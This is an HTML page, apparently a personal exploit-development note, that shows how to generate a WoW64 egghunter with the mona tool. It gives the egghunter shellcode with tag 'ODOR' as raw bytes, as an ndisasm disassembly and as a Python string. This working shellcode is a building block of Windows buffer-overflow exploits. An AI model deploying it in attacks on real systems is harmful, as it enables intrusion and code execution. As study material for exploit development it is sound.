<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MONA egghunter</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">MONA egghunter</h1><br/><strong><h2>Generate </h2></strong><br />!mona egg -t ODOR -wow64<br /><br /><strong><h2>Decode via NASM</h2></strong><br />$ echo -ne "\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x52\x53\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x10\x5a\x3c\x05\x74\xe3\xb8\x4f\x44\x4f\x52\x8b\xfa\xaf\x75\xde\xaf\x75\xdb\xff\xe7" | ndisasm -u -<br />00000000  33D2              xor edx,edx<br />00000002  6681CAFF0F        or dx,0xfff<br />00000007  33DB              xor ebx,ebx<br />00000009  42                inc edx<br />0000000A  52                push edx<br />0000000B  53                push ebx<br />0000000C  53                push ebx<br />0000000D  53                push ebx<br />0000000E  53                push ebx<br />0000000F  6A29              push byte +0x29<br />00000011  58                pop eax<br />00000012  B3C0              mov bl,0xc0<br />00000014  64FF13            call [fs:ebx]<br />00000017  83C410            add esp,byte +0x10<br />0000001A  5A                pop edx<br />0000001B  3C05              cmp al,0x5<br />0000001D  74E3              jz 0x2<br />0000001F  B84F444F52        mov eax,0x524f444f<br />00000024  8BFA              mov edi,edx<br />00000026  AF                scasd<br />00000027  75DE              jnz 0x7<br />00000029  AF                scasd<br />0000002A  75DB              jnz 0x7<br />0000002C  FFE7              jmp edi<br /><br /><br /><strong>Python variant</strong><br /># Egghunter ODOR<br />egghunt = (<br />        "\x33\xd2"              #  xor    edx,edx<br />        "\x66\x81\xca\xff\x0f"  #  or     dx,0xfff<br />        "\x33\xdb"              #  xor    ebx,ebx<br />        "\x42"                  #  inc    edx<br />        "\x52"                  #  push   edx<br />        "\x53"                  #  push   ebx<br />        "\x53"                  #  push   ebx<br />        "\x53"                  #  push   ebx<br />        "\x53"                  #  push   ebx<br />        "\x6a\x29"              #  push   0x29<br />        "\x58"                  #  pop    eax<br />        "\xb3\xc0"              #  mov    bl,0xc0<br />        "\x64\xff\x13"          #  call   DWORD           PTR  fs:[ebx]<br />        "\x83\xc4\x10"          #  add    esp,0x10<br />        "\x5a"                  #  pop    edx<br />        "\x3c\x05"              #  cmp    al,0x5<br />        "\x74\xe3"              #  je     0x2<br />        "\xb8\x4f\x44\x4f\x52"  #  mov    eax,0x524f444f    # Tag "ODOR"<br />        "\x8b\xfa"              #  mov    edi,edx<br />        "\xaf"                  #  scas   eax,DWORD       PTR  es:[edi]<br />        "\x75\xde"              #  jne    0x7<br />        "\xaf"                  #  scas   eax,DWORD       PTR  es:[edi]<br />        "\x75\xdb"              #  jne    0x7<br />        "\xff\xe7"              #  jmp    edi<br />)<br /><br /># Eggstring<br />egg = "ODOR"[::-1] * 2<br /><br />)</div></body></html>